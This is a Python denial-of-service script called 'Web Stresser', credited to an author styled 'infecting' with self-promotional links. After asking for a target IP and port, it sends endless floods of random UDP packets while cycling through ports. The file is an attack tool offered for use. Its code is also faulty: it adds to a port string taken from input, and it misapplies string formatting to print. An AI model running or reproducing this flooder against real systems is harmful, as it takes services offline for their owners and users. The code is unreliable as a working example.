import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("cls")
os.system('pyfiglet Web Stresser')
print
print ("Author   : infecting#0001")
print ("YouTube : https://www.youtube.com/c/Infecting")
print ("GitHub   : https://github.com/maliciousinfecting")
print ("Website : https://sites.google.com/view/maliciousteam")
print
ip = input("(IP)root@infecting-$: ")
port = input("(PORT)root@infecting-$: ")

os.system("cls")
os.system("pyfiglet Attack Starting")
print ('[                    ] 0% ')
time.sleep(5)
print ('[=====               ] 25%')
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
     if port == 65534:
       port = 1